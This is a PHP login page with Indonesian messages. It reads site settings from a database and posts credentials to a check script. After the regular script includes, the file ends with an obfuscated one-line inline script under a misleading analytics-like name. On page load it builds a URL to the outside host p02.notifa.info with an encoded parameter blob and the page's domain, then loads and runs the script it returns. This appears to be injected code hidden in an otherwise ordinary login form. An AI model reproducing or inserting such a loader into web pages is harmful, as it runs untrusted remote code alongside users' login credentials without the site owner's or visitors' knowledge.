<?php
include_once "../control/database.php";

$query = mysqli_query($koneksidb, "SELECT * FROM setting")
or die('Query salah : '.mysqli_error($koneksidb));
$myData_setting = mysqli_fetch_assoc($query);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title><?php echo $myData_setting['title']; ?></title>
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1" />
	<link rel="shortcut icon" href="../assets/img/favicon/favicon-32x32.png"/>
    <link href="css/bootstrap.min.css" type="text/css" rel="stylesheet">
    <link href="css/font-awesome.min.css" type="text/css" rel="stylesheet">
    <link href="css/animate.css" type="text/css" rel="stylesheet">
    <link href="css/login_new.css" type="text/css" rel="stylesheet">
</head>
<body>
<div class="main-login">

    <div class="login-bg">

    </div>
    <div class="login-container">
	<br><br>
	<a href="../home">
		     <img src="../images/logo/<?php echo $myData_setting['logo']; ?>" width="35%">		
	</a>
        <h2></h2>
                <h4>
            
	<br><br>		
		<?php  
      if (empty($_GET['alert'])) {
        echo "";
      } 
      elseif ($_GET['alert'] == 1) {
        echo "<i class='icon fa fa-times-circle'></i> Login Gagal!";
      }
      elseif ($_GET['alert'] == 2) {
        echo "<i class='icon fa fa-check-circle'></i>  Anda berhasil logout.";
      }
	  elseif ($_GET['alert'] == 3) {
        echo "<i class='icon fa fa-times-circle'></i> Anda tidak berhak mengakses halaman ini.";
      }
      ?>	
        </h4>
		
	  
        <form class="form form--login" method="post" action="login-check.php">
		

	  
			<div class="form__field">
			  <label class="fa fa-user" for="username"><span class="hidden">Username</span></label>
			  <input id="username" name="username" type="text" class="input" maxlength="60" placeholder="Username" required>
			</div>
		
			<div class="form__field">
			  <label class="fa fa-lock" for="password"><span class="hidden">Password</span></label>
			  <input id="password" name="password" type="password" class="input" maxlength="15" placeholder="Password" required>
			</div>
		
			<button type="submit" class="btn btn-black" name="login"><i class="fa fa-sign-in"></i> Login</button>
        </form>

		
        <div class="copyright">			
            &copy; <?php echo date("Y") ?> <?php echo $myData_setting['footer']; ?>
        </div>

    </div>
    <div class="clear"></div>

</div>




				<div class="copy"></div>
			</div>
			
	<script type="text/javascript" src="js/jquery.js"></script>
    <script type="text/javascript" src="js/bootstrap.min.js"></script>

	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mh2VDK8gqfmcAkX%2bnE1FIC1oNERuxddVAMoxhHpK1ZBHTScyFL2c4gu%2bYgufj8bj9Zqz9tnxYdfXdXgdeaw6C6DFWMCL4QA7SInwyi1rEFS8yUowzFzl%2baVOGLg0ear3yAyCu%2f2QdIE5AXCeQ%2bZDgFxn92bzaKvMphSwb5VzVRFPYcQah638B2BXh7LwxvfvwUebobDINautXx9tQ39M4cC8%2b74AdnZVuz%2brZs9s5TAue6MQFpEEQlowBj2hL162u5wfAuROA0WrPPZL08bdZXjefHsi%2bmR7ICAgSTBCcj%2bJCcn%2bKjQEScLRvTh1gmJ%2bqbP4%2f5c%2fkpjluNnNclBfpwQ6NEuPyRVh0SsnX419kpd19W3adJUzL65QbF2h83XQAYid4EGT7yomkyQ00AMtEFiu5aG%2bPjyQP0Gm4%2b8GF1zF3i1vhxrq5kD7fifoz2JB%2bXa0TmVKfnMepxG6lnk8THb6uBrhKg2BaAfDimDOSu6WyD0DfTR6AcpanBXBbH3zQlPDv%2fQfk6Y8%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>